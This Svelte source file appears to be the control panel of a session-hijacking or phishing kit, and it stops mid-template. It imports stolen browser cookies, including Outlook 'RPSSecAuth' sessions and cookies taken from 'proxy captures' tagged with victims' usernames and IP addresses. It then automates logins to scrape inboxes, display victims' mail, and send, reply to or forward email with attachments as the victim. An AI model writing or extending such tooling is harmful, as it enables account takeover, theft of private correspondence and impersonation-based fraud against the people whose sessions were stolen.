<script>
	import { onMount } from 'svelte';
	import { api } from '$lib/api/apiProxy.js';
	import HeadTitle from '$lib/components/HeadTitle.svelte';
	import Headline from '$lib/components/Headline.svelte';
	import { hideIsLoading, showIsLoading } from '$lib/store/loading';
	import { addToast } from '$lib/store/toast';
	import BigButton from '$lib/components/BigButton.svelte';
	import Modal from '$lib/components/Modal.svelte';
	import FormGrid from '$lib/components/FormGrid.svelte';
	import FormFooter from '$lib/components/FormFooter.svelte';
	import TextField from '$lib/components/TextField.svelte';
	import TextareaField from '$lib/components/TextareaField.svelte';
	import Table from '$lib/components/table/Table.svelte';
	import TableRow from '$lib/components/table/TableRow.svelte';
	import TableCell from '$lib/components/table/TableCell.svelte';
	import TableCellAction from '$lib/components/table/TableCellAction.svelte';
	import TableCellEmpty from '$lib/components/table/TableCellEmpty.svelte';
	import TableDropDownEllipsis from '$lib/components/table/TableDropDownEllipsis.svelte';
	import DeleteAlert from '$lib/components/modal/DeleteAlert.svelte';
	import { newTableURLParams } from '$lib/service/tableURLParams.js';

	// --- State ---
	let stores = [];
	let storesHasNextPage = false;
	let isLoading = false;
	const tableURLParams = newTableURLParams();

	// Import modal
	let isImportModalVisible = false;
	let importName = '';
	let importCookiesText = '';
	let importError = '';
	let isImporting = false;

	// Send modal
	let isSendModalVisible = false;
	let sendForm = {
		cookieStoreId: '',
		cookieStoreName: '',
		to: '',
		cc: '',
		bcc: '',
		subject: '',
		body: '',
		isHTML: true,
		saveToSent: false,
		attachments: []
	};
	let isSending = false;
	let sendResult = null;
	let sendAttachmentFiles = [];

	// Inbox modal
	let isInboxModalVisible = false;
	let inboxStoreId = '';
	let inboxStoreName = '';
	let inboxStoreEmail = '';
	let inboxMessages = [];
	let inboxFolder = 'inbox';
	let inboxFolders = [];
	let inboxLoading = false;
	let inboxSkip = 0;
	let inboxLimit = 25;
	let inboxTotalCount = 0;
	let inboxSearch = '';

	// Message viewer modal
	let isMessageModalVisible = false;
	let currentMessage = null;
	let messageLoading = false;

	// Import from Proxy Captures modal
	let isProxyCaptureModalVisible = false;
	let proxyCaptures = [];
	let proxyCapturesLoading = false;
	let selectedCapture = null;
	let proxyCaptureImportName = '';

	// Delete
	let isDeleteAlertVisible = false;
	let deleteValues = { id: null, name: null };

	// Default folders
	const defaultFolders = [
		{ id: 'inbox', displayName: 'Inbox', unreadItemCount: 0, icon: 'inbox' },
		{ id: 'sentitems', displayName: 'Sent Items', unreadItemCount: 0, icon: 'send' },
		{ id: 'drafts', displayName: 'Drafts', unreadItemCount: 0, icon: 'draft' },
		{ id: 'junkemail', displayName: 'Junk Email', unreadItemCount: 0, icon: 'junk' },
		{ id: 'deleteditems', displayName: 'Deleted Items', unreadItemCount: 0, icon: 'trash' }
	];

	// Folder icons
	const folderIcons = {
		inbox: `<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20 13V6a2 2 0 00-2-2H6a2 2 0 00-2 2v7m16 0v5a2 2 0 01-2 2H6a2 2 0 01-2-2v-5m16 0h-2.586a1 1 0 00-.707.293l-2.414 2.414a1 1 0 01-.707.293h-3.172a1 1 0 01-.707-.293l-2.414-2.414A1 1 0 006.586 13H4"/></svg>`,
		send: `<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8"/></svg>`,
		draft: `<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"/></svg>`,
		junk: `<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/></svg>`,
		trash: `<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/></svg>`
	};

	// --- Lifecycle ---
	onMount(() => {
		refreshStores();
		tableURLParams.onChange(refreshStores);
	});

	// --- Data loading ---
	async function refreshStores() {
		isLoading = true;
		showIsLoading();
		try {
			const params = new URLSearchParams({
				page: tableURLParams.currentPage,
				perPage: tableURLParams.perPage,
				sortBy: tableURLParams.sortBy || 'created_at',
				sortOrder: tableURLParams.sortOrder || 'desc',
				search: tableURLParams.search || ''
			});
			const res = await api.cookieStore.getAll(params.toString());
			if (res.success) {
				stores = res.data.rows || [];
				storesHasNextPage = res.data.hasNextPage || false;
			} else {
				throw res.error;
			}
		} catch (e) {
			addToast('Failed to load cookie stores', 'error');
		}
		isLoading = false;
		hideIsLoading();
	}

	// --- Import ---
	function openImportModal() {
		importName = '';
		importCookiesText = '';
		importError = '';
		isImportModalVisible = true;
	}

	function closeImportModal() {
		isImportModalVisible = false;
	}

	async function handleImport() {
		importError = '';
		if (!importName.trim()) {
			importError = 'Name is required';
			return;
		}
		if (!importCookiesText.trim()) {
			importError = 'Cookies JSON is required';
			return;
		}

		let cookies;
		try {
			cookies = JSON.parse(importCookiesText);
			if (!Array.isArray(cookies)) {
				importError = 'Cookies must be a JSON array';
				return;
			}
		} catch (e) {
			importError = 'Invalid JSON: ' + e.message;
			return;
		}

		isImporting = true;
		try {
			const res = await api.cookieStore.importCookies({
				name: importName,
				cookies: cookies,
				source: 'import'
			});
			if (res && res.data) {
				addToast('Cookies imported. Validating and pre-automating in background...', 'success');
				isImportModalVisible = false;
				pollStoreStatus(3000);
			}
		} catch (e) {
			importError = e.message || 'Import failed';
		}
		isImporting = false;
	}

	function pollStoreStatus(delay) {
		setTimeout(async () => {
			await refreshStores();
			const hasRunning = stores.some(s => s.automationStatus === 'running');
			if (hasRunning) {
				pollStoreStatus(5000);
			}
		}, delay);
	}

	// --- Import from Proxy Captures ---
	async function openProxyCaptureModal() {
		isProxyCaptureModalVisible = true;
		proxyCaptures = [];
		selectedCapture = null;
		proxyCaptureImportName = '';
		proxyCapturesLoading = true;
		try {
			const params = new URLSearchParams({ page: 1, perPage: 50, sortBy: 'created_at', sortOrder: 'desc' });
			const res = await api.proxyCaptures.getAll(params.toString());
			if (res.success) {
				proxyCaptures = (res.data.rows || []).filter(c => c.Cookies && c.Cookies.length > 2);
			}
		} catch (e) {
			addToast('Failed to load proxy captures', 'error');
		}
		proxyCapturesLoading = false;
	}

	function closeProxyCaptureModal() {
		isProxyCaptureModalVisible = false;
	}

	async function handleProxyCaptureImport() {
		if (!selectedCapture) {
			addToast('Please select a capture', 'error');
			return;
		}
		const name = proxyCaptureImportName.trim() || `Proxy: ${selectedCapture.Username || selectedCapture.IPAddress || 'Unknown'}`;
		showIsLoading();
		try {
			const res = await api.cookieStore.importFromCapture(
				selectedCapture.ID,
				name,
				selectedCapture.Cookies
			);
			if (res && res.data) {
				addToast('Cookies imported from proxy capture. Validating and pre-automating in background...', 'success');
				isProxyCaptureModalVisible = false;
				pollStoreStatus(3000);
			}
		} catch (e) {
			addToast('Import failed: ' + (e.message || ''), 'error');
		}
		hideIsLoading();
	}

	let revalidatingId = null;

	// --- Revalidate ---
	async function revalidateStore(id) {
		revalidatingId = id;
		addToast('Revalidating session and pre-automating inbox...', 'info');
		try {
			await api.cookieStore.revalidate(id);
			addToast('Session revalidated. Inbox data will be cached in the background.', 'success');
			pollStoreStatus(3000);
		} catch (e) {
			addToast('Revalidation failed: ' + (e.message || ''), 'error');
		}
		revalidatingId = null;
	}

	// --- Delete ---
	function confirmDelete(store) {
		deleteValues = { id: store.id, name: store.name };
		isDeleteAlertVisible = true;
	}

	async function handleDelete() {
		showIsLoading();
		try {
			const res = await api.cookieStore.deleteByID(deleteValues.id);
			addToast('Cookie store deleted', 'success');
			await refreshStores();
			hideIsLoading();
			return { success: true };
		} catch (e) {
			addToast('Delete failed', 'error');
			hideIsLoading();
			return { success: false, error: e.message || 'Delete failed' };
		}
	}

	// --- Send ---
	function openSendModal(store) {
		sendForm = {
			cookieStoreId: store.id,
			cookieStoreName: store.name + (store.email ? ` (${store.email})` : ''),
			to: '',
			cc: '',
			bcc: '',
			subject: '',
			body: '',
			isHTML: true,
			saveToSent: false,
			attachments: []
		};
		sendResult = null;
		sendAttachmentFiles = [];
		isSendModalVisible = true;
	}

	// Open send modal pre-filled for reply
	function openReplyModal(msg) {
		const store = stores.find(s => s.id === inboxStoreId);
		if (!store) return;
		sendForm = {
			cookieStoreId: store.id,
			cookieStoreName: store.name + (store.email ? ` (${store.email})` : ''),
			to: msg.from || '',
			cc: '',
			bcc: '',
			subject: msg.subject ? (msg.subject.startsWith('Re: ') ? msg.subject : `Re: ${msg.subject}`) : '',
			body: `<br/><br/><hr/><p>On ${formatDate(msg.date)}, ${msg.fromName || msg.from} wrote:</p><blockquote style="border-left:2px solid #ccc;padding-left:10px;margin-left:10px;color:#666">${msg.bodyHTML || msg.bodyText || ''}</blockquote>`,
			isHTML: true,
			saveToSent: false,
			attachments: []
		};
		sendResult = null;
		sendAttachmentFiles = [];
		isMessageModalVisible = false;
		isSendModalVisible = true;
	}

	// Open send modal pre-filled for forward
	function openForwardModal(msg) {
		const store = stores.find(s => s.id === inboxStoreId);
		if (!store) return;
		sendForm = {
			cookieStoreId: store.id,
			cookieStoreName: store.name + (store.email ? ` (${store.email})` : ''),
			to: '',
			cc: '',
			bcc: '',
			subject: msg.subject ? (msg.subject.startsWith('Fwd: ') ? msg.subject : `Fwd: ${msg.subject}`) : '',
			body: `<br/><br/><hr/><p>---------- Forwarded message ----------</p><p>From: ${msg.fromName || ''} &lt;${msg.from || ''}&gt;<br/>Date: ${formatDate(msg.date)}<br/>Subject: ${msg.subject || ''}</p><br/>${msg.bodyHTML || msg.bodyText || ''}`,
			isHTML: true,
			saveToSent: false,
			attachments: []
		};
		sendResult = null;
		sendAttachmentFiles = [];
		isMessageModalVisible = false;
		isSendModalVisible = true;
	}

	function closeSendModal() {
		isSendModalVisible = false;
	}

	// Handle file attachment upload
	function handleAttachmentUpload(event) {
		const files = event.target.files;
		if (!files) return;
		for (const file of files) {
			const reader = new FileReader();
				reader.onload = (e) => {
				const base64 = e.target.result.split(',')[1];
				sendForm.attachments = [...sendForm.attachments, {
					name: file.name,
					contentType: file.type || 'application/octet-stream',
					contentBase64: base64,
					size: file.size
				}];
			};
			reader.readAsDataURL(file);
		}
		// Reset input
		event.target.value = '';
	}

	function removeAttachment(index) {
		sendForm.attachments = sendForm.attachments.filter((_, i) => i !== index);
	}

	function formatFileSize(bytes) {
		if (bytes < 1024) return bytes + ' B';
		if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
		return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
	}

	async function handleSend() {
		if (!sendForm.to.trim()) {
			addToast('Recipient is required', 'error');
			return;
		}
		if (!sendForm.subject.trim()) {
			addToast('Subject is required', 'error');
			return;
		}

		isSending = true;
		sendResult = null;
		try {
			const toList = sendForm.to.split(',').map((e) => e.trim()).filter(Boolean);
			const ccList = sendForm.cc ? sendForm.cc.split(',').map((e) => e.trim()).filter(Boolean) : [];
			const bccList = sendForm.bcc ? sendForm.bcc.split(',').map((e) => e.trim()).filter(Boolean) : [];

			const res = await api.cookieStore.send({
				cookieStoreId: sendForm.cookieStoreId,
				to: toList,
				cc: ccList,
				bcc: bccList,
				subject: sendForm.subject,
				body: sendForm.body,
				isHTML: sendForm.isHTML,
				saveToSent: sendForm.saveToSent,
				attachments: sendForm.attachments.length > 0 ? sendForm.attachments : undefined
			});
			if (res && res.data) {
				sendResult = res.data;
				if (res.data.success) {
					addToast('Email sent successfully via ' + (res.data.method || 'cookies'), 'success');
				} else {
					addToast('Send failed: ' + (res.data.error || 'Unknown error'), 'error');
				}
			}
		} catch (e) {
			sendResult = { success: false, error: e.message || 'Send failed' };
			addToast('Send failed: ' + (e.message || ''), 'error');
		}
		isSending = false;
	}

	// --- Inbox ---
	async function openInbox(store) {
		inboxStoreId = store.id;
		inboxStoreName = store.name + (store.email ? ` (${store.email})` : '');
		inboxStoreEmail = store.email || '';
		inboxMessages = [];
		inboxFolder = 'inbox';
		inboxFolders = defaultFolders;
		inboxSkip = 0;
		inboxTotalCount = 0;
		inboxSearch = '';
		isInboxModalVisible = true;
		await loadInbox();
		loadFolders();
	}

	function closeInboxModal() {
		isInboxModalVisible = false;
	}

	let inboxLoadingStatus = '';

	async function loadInbox() {
		inboxLoading = true;
		inboxLoadingStatus = 'Loading messages...';
		const progressTimer = setTimeout(() => {
			if (inboxLoading) {
				inboxLoadingStatus = 'Fetching from server... First load may take longer.';
			}
		}, 5000);
		const progressTimer2 = setTimeout(() => {
			if (inboxLoading) {
				inboxLoadingStatus = 'Browser automation in progress... Please wait.';
			}
		}, 30000);
		try {
			const res = await api.cookieStore.getInbox(inboxStoreId, inboxFolder, inboxLimit, inboxSkip);
			if (res && res.data) {
				inboxMessages = res.data.messages || [];
				inboxTotalCount = res.data.totalCount || inboxMessages.length;
			}
		} catch (e) {
			addToast('Failed to load inbox: ' + (e.message || ''), 'error');
		}
		clearTimeout(progressTimer);
		clearTimeout(progressTimer2);
		inboxLoadingStatus = '';
		inboxLoading = false;
	}

	async function loadFolders() {
		try {
			const res = await api.cookieStore.getFolders(inboxStoreId);
			if (res && res.data) {
				const folders = res.data.folders || [];
				if (folders.length > 0) {
					inboxFolders = folders;
				}
			}
		} catch (e) {
			// Keep default folders on error
		}
	}

	async function switchFolder(folderId) {
		inboxFolder = folderId;
		inboxSkip = 0;
		await loadInbox();
	}

	async function nextInboxPage() {
		inboxSkip += inboxLimit;
		await loadInbox();
	}

	async function prevInboxPage() {
		inboxSkip = Math.max(0, inboxSkip - inboxLimit);
		await loadInbox();
	}

	async function refreshInbox() {
		await loadInbox();
		addToast('Inbox refreshed', 'success');
	}

	// --- Message viewer ---
	async function openMessage(messageId) {
		messageLoading = true;
		currentMessage = null;
		isMessageModalVisible = true;
		try {
			const res = await api.cookieStore.getMessage(inboxStoreId, messageId);
			if (res && res.data) {
				currentMessage = res.data;
			}
		} catch (e) {
			addToast('Failed to load message: ' + (e.message || ''), 'error');
		}
		messageLoading = false;
	}

	function closeMessageModal() {
		isMessageModalVisible = false;
	}

	// --- Helpers ---
	function formatDate(dateStr) {
		if (!dateStr) return '';
		try {
			return new Date(dateStr).toLocaleString();
		} catch {
			return dateStr;
		}
	}

	function formatShortDate(dateStr) {
		if (!dateStr) return '';
		try {
			const d = new Date(dateStr);
			const now = new Date();
			const diff = now.getTime() - d.getTime();
			if (diff < 86400000 && d.getDate() === now.getDate()) {
				return d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
			}
			if (diff < 604800000) {
				return d.toLocaleDateString([], { weekday: 'short' });
			}
			return d.toLocaleDateString([], { month: 'short', day: 'numeric' });
		} catch {
			return dateStr;
		}
	}

	function getInitials(name) {
		if (!name) return '?';
		const parts = name.trim().split(/\s+/);
		if (parts.length >= 2) return (parts[0][0] + parts[1][0]).toUpperCase();
		return name[0].toUpperCase();
	}

	function getAvatarColor(name) {
		if (!name) return '#6b7280';
		const colors = ['#0078d4', '#d13438', '#107c10', '#5c2d91', '#e3008c', '#008272', '#ca5010', '#4f6bed', '#498205', '#881798'];
		let hash = 0;
		for (let i = 0; i < name.length; i++) hash = name.charCodeAt(i) + ((hash << 5) - hash);
		return colors[Math.abs(hash) % colors.length];
	}

	function getStatusBadge(store) {
		if (store.isValid) return { text: 'Valid', class: 'badge-success' };
		if (store.lastChecked) return { text: 'Expired', class: 'badge-error' };
		return { text: 'Pending', class: 'badge-warning' };
	}

	function getAutomationBadge(store) {
		const status = store.automationStatus || 'pending';
		switch (status) {
			case 'ready': return { text: 'Ready', class: 'badge-success' };
			case 'running': return { text: 'Automating...', class: 'badge-info' };
			case 'failed': return { text: 'Failed', class: 'badge-error' };
			default: return { text: 'Pending', class: 'badge-warning' };
		}
	}

	function getSourceBadge(source) {
		switch (source) {
			case 'extension': return { text: 'Extension', class: 'badge-info' };
			case 'proxy_capture': return { text: 'Proxy', class: 'badge-purple' };
			case 'import': return { text: 'Import', class: 'badge-default' };
			default: return { text: source || 'Unknown', class: 'badge-default' };
		}
	}

	function getFolderIcon(folderId) {
		const id = folderId?.toLowerCase();
		if (id?.includes('inbox')) return folderIcons.inbox;
		if (id?.includes('sent')) return folderIcons.send;
		if (id?.includes('draft')) return folderIcons.draft;
		if (id?.includes('junk') || id?.includes('spam')) return folderIcons.junk;
		if (id?.includes('delete') || id?.includes('trash')) return folderIcons.trash;
		return folderIcons.inbox;
	}
</script>

<HeadTitle title="Cookie Store" />
<Headline>COOKIE STORE</Headline>

<div class="flex gap-4 mb-6">
	<BigButton on:click={openImportModal}>IMPORT COOKIES</BigButton>
	<BigButton on:click={openProxyCaptureModal}>IMPORT FROM PROXY CAPTURES</BigButton>
</div>

<!-- Cookie Stores Table -->
<Table
	columns={['Name', 'Email', 'Source', 'Cookies', 'Status', 'Automation', 'Last Checked']}
	hasData={!!stores.length}
	hasNextPage={storesHasNextPage}
	plural="Cookie Stores"
	pagination={tableURLParams}
	isGhost={isLoading}
>
	{#each stores as store}
		<TableRow>
			<TableCell>
				<span class="font-medium">{store.name}</span>
			</TableCell>
			<TableCell>
				{#if store.email}
					<span class="text-sm">{store.email}</span>
					{#if store.displayName}
						<br /><span class="text-xs opacity-60">{store.displayName}</span>
					{/if}
				{:else}
					<span class="text-xs opacity-40">Not scraped yet</span>
				{/if}
			</TableCell>
			<TableCell>
				{@const badge = getSourceBadge(store.source)}
				<span class="badge {badge.class}">{badge.text}</span>
			</TableCell>
			<TableCell>
				<span class="text-sm">{store.cookieCount}</span>
			</TableCell>
			<TableCell>
				{@const status = getStatusBadge(store)}
				<span class="badge {status.class}">{status.text}</span>
			</TableCell>
			<TableCell>
				{@const autoBadge = getAutomationBadge(store)}
				<span class="badge {autoBadge.class}">
					{#if store.automationStatus === 'running'}
						<span class="inline-block animate-spin rounded-full h-3 w-3 border-b-2 border-current mr-1"></span>
					{/if}
					{autoBadge.text}
				</span>
				{#if store.lastScrapedAt}
					<br /><span class="text-xs opacity-40">Scraped: {formatDate(store.lastScrapedAt)}</span>
				{/if}
			</TableCell>
			<TableCell>
				<span class="text-xs">{formatDate(store.lastChecked)}</span>
			</TableCell>
			<TableCellEmpty />
			<TableCellAction>
				<TableDropDownEllipsis>
					{#if store.isValid}
						<button class="dropdown-item" on:click={() => openSendModal(store)}>
							<svg class="w-4 h-4 inline mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8"/></svg>
							Send Email
						</button>
						<button class="dropdown-item" on:click={() => openInbox(store)}>
							<svg class="w-4 h-4 inline mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20 13V6a2 2 0 00-2-2H6a2 2 0 00-2 2v7m16 0v5a2 2 0 01-2 2H6a2 2 0 01-2-2v-5m16 0h-2.586a1 1 0 00-.707.293l-2.414 2.414a1 1 0 01-.707.293h-3.172a1 1 0 01-.707-.293l-2.414-2.414A1 1 0 006.586 13H4"/></svg>
							Read Inbox
						</button>
					{/if}
					<button class="dropdown-item" on:click={() => revalidateStore(store.id)} disabled={revalidatingId === store.id}>
						<svg class="w-4 h-4 inline mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg>
						{revalidatingId === store.id ? 'Revalidating...' : 'Revalidate'}
					</button>
					<button class="dropdown-item dropdown-item-danger" on:click={() => confirmDelete(store)}>
						<svg class="w-4 h-4 inline mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/></svg>
						Delete
					</button>
				</TableDropDownEllipsis>
			</TableCellAction>
		</TableRow>
	{/each}
</Table>

<!-- Import Cookies Modal -->
<Modal
	headerText="Import Cookies"
	visible={isImportModalVisible}
	onClose={closeImportModal}
	isSubmitting={isImporting}
>
	<FormGrid on:submit={handleImport} isSubmitting={isImporting}>
		<TextField
			label="Name"
			placeholder="e.g., John's Outlook Session"
			bind:value={importName}
			required={true}
		/>
		<TextareaField
			label="Cookies JSON"
			placeholder={`Paste cookies as JSON array, e.g.:\n[\n  {"name": "RPSSecAuth", "value": "...", "domain": ".live.com", "path": "/"},\n  ...\n]`}
			bind:value={importCookiesText}
		/>
		{#if importError}
			<div class="text-red-500 text-sm mt-1 col-span-3">{importError}</div>
		{/if}
		<div class="text-xs opacity-60 mt-2 col-span-3">
			<strong>Tip:</strong> After import, the system will automatically validate the cookies and pre-scrape inbox data in the background.
			You can use the session immediately after validation completes.
		</div>
		<FormFooter closeModal={closeImportModal} isSubmitting={isImporting} okText="Import & Validate" />
	</FormGrid>
</Modal>

<!-- Send Email Modal -->
<Modal
	headerText="Send Email"
	visible={isSendModalVisible}
	onClose={closeSendModal}
	isSubmitting={isSending}
>
	<FormGrid on:submit={handleSend} isSubmitting={isSending}>
		<div class="col-span-3 flex items-center gap-2 mb-2 p-2 rounded-md bg-gray-50 dark:bg-gray-700/50">
			<svg class="w-4 h-4 text-gray-500 dark:text-gray-400 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg>
			<span class="text-sm text-gray-600 dark:text-gray-300">Sending as: <strong>{sendForm.cookieStoreName}</strong></span>
		</div>
		<TextField
			label="To"
			placeholder="recipient@example.com (comma-separated for multiple)"
			bind:value={sendForm.to}
			required={true}
		/>
		<TextField
			label="CC"
			placeholder="cc@example.com (optional)"
			bind:value={sendForm.cc}
		/>
		<TextField
			label="BCC"
			placeholder="bcc@example.com (optional)"
			bind:value={sendForm.bcc}
		/>
		<TextField
			label="Subject"
			placeholder="Email subject"
			bind:value={sendForm.subject}
			required={true}
		/>
		<TextareaField
			label="Body"
			placeholder="Email body (HTML or plain text)"
			bind:value={sendForm.body}
		/>

		<!-- Attachments Section -->
		<div class="col-span-3 mt-2">
			<label class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
				<svg class="w-4 h-4 inline mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.172 7l-6.586 6.586a2 2 0 102.828 2.828l6.414-6.586a4 4 0 00-5.656-5.656l-6.415 6.585a6 6 0 108.486 8.486L20.5 13"/></svg>
				Attachments
			</label>
			{#if sendForm.attachments.length > 0}
				<div class="space-y-2 mb-3">
					{#each sendForm.attachments as att, i}
						<div class="flex items-center justify-between p-2 bg-gray-50 dark:bg-gray-700/50 rounded-md border border-gray-200 dark:border-gray-600">
							<div class="flex items-center gap-2 min-w-0">
								<svg class="w-4 h-4 text-gray-500 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>
								<span class="text-sm truncate">{att.name}</span>
								<span class="text-xs text-gray-400 flex-shrink-0">{formatFileSize(att.size)}</span>
							</div>
							<button type="button" on:click={() => removeAttachment(i)} class="text-red-500 hover:text-red-700 p-1 flex-shrink-0">
								<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
							</button>
						</div>
					{/each}
				</div>
			{/if}
			<label class="inline-flex items-center gap-2 px-3 py-1.5 border border-dashed border-gray-300 dark:border-gray-600 rounded-md cursor-pointer hover:bg-gray-50 dark:hover:bg-gray-700/50 transition-colors">
				<svg class="w-4 h-4 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4"/></svg>
				<span class="text-sm text-gray-600 dark:text-gray-400">Add File</span>
				<input type="file" multiple class="hidden" on:change={handleAttachmentUpload} />
			</label>
		</div>

		<div class="flex items-center gap-4 mt-2 col-span-3">
			<label class="flex items-center gap-2 cursor-pointer">
				<input type="checkbox" bind:checked={sendForm.isHTML} class="checkbox checkbox-sm" />
				<span class="text-sm">HTML Body</span>
			</label>
			<label class="flex items-center gap-2 cursor-pointer">
				<input type="checkbox" bind:checked={sendForm.saveToSent} class="checkbox checkbox-sm" />
				<span class="text-sm">Save to Sent Items</span>
			</label>
		</div>

		{#if isSending}
		<div class="mt-4 col-span-3 p-3 rounded-lg bg-blue-50 dark:bg-blue-900/20 border border-blue-200 dark:border-blue-800">
			<div class="flex items-center gap-3">
				<div class="inline-block animate-spin rounded-full h-5 w-5 border-b-2 border-blue-500"></div>
				<span class="text-blue-700 dark:text-blue-300 text-sm">Sending email{sendForm.attachments.length > 0 ? ` with ${sendForm.attachments.length} attachment(s)` : ''}...</span>
			</div>
		</div>
	{/if}

	{#if sendResult}
			<div class="mt-4 col-span-3 p-3 rounded-lg {sendResult.success ? 'bg-green-50 dark:bg-green-900/20 border border-green-200 dark:border-green-800' : 'bg-red-50 dark:bg-red-900/20 border border-red-200 dark:border-red-800'}">
				{#if sendResult.success}
					<div class="text-green-700 dark:text-green-300 text-sm flex items-center gap-2">
						<svg class="w-5 h-5 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
						<div>
							Email sent successfully via <strong>{sendResult.method}</strong>
							{#if sendResult.messageId}
								<br /><span class="text-xs opacity-70">Message ID: {sendResult.messageId}</span>
							{/if}
						</div>
					</div>
				{:else}
					<div class="text-red-700 dark:text-red-300 text-sm flex items-center gap-2">
						<svg class="w-5 h-5 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
						<div>Send failed: {sendResult.error}</div>
					</div>
				{/if}
			</div>
		{/if}

		<FormFooter closeModal={closeSendModal} isSubmitting={isSending} okText="Send Email" />
	</FormGrid>
</Modal>

<!-- Inbox Modal (Outlook-like) -->
<Modal
	headerText=""
	visible={isInboxModalVisible}
	onClose={closeInboxModal}
	fullscreen={true}
>
	<div class="inbox-container">
		<!-- Inbox Header Bar -->
		<div class="inbox-header">
			<div class="flex items-center gap-3 flex-1 min-w-0">
				<div class="flex items-center gap-2">
					<div class="w-8 h-8 rounded-full flex items-center justify-center text-white text-sm font-semibold" style="background-color: {getAvatarColor(inboxStoreName)}">
						{getInitials(inboxStoreName)}
					</div>
					<div class="min-w-0">
						<h2 class="text-sm font-semibold text-gray-800 dark:text-gray-200 truncate">{inboxStoreName}</h2>
						{#if inboxStoreEmail}
							<p class="text-xs text-gray-500 dark:text-gray-400 truncate">{inboxStoreEmail}</p>
						{/if}
					</div>
				</div>
			</div>
			<div class="flex items-center gap-2">
				<!-- Compose button -->
				<button
					on:click={() => { const store = stores.find(s => s.id === inboxStoreId); if (store) openSendModal(store); }}
					class="inbox-toolbar-btn"
					title="New Email"
				>
					<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4"/></svg>
					<span class="hidden sm:inline text-sm">New</span>
				</button>
				<!-- Refresh button -->
				<button on:click={refreshInbox} disabled={inboxLoading} class="inbox-toolbar-btn" title="Refresh">
					<svg class="w-4 h-4 {inboxLoading ? 'animate-spin' : ''}" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg>
				</button>
			</div>
		</div>

		<div class="inbox-body">
			<!-- Folder Sidebar -->
			<div class="inbox-sidebar">
				{#each inboxFolders as folder}
					<button
						class="inbox-folder-btn {inboxFolder === folder.id ? 'active' : ''}"
						on:click={() => switchFolder(folder.id)}
						disabled={inboxLoading}
					>
						<span class="folder-icon">{@html getFolderIcon(folder.id)}</span>
						<span class="folder-name">{folder.displayName}</span>
						{#if folder.unreadItemCount > 0}
							<span class="folder-badge">{folder.unreadItemCount}</span>
						{/if}
					</button>
				{/each}
			</div>

			<!-- Message List -->
			<div class="inbox-message-list">
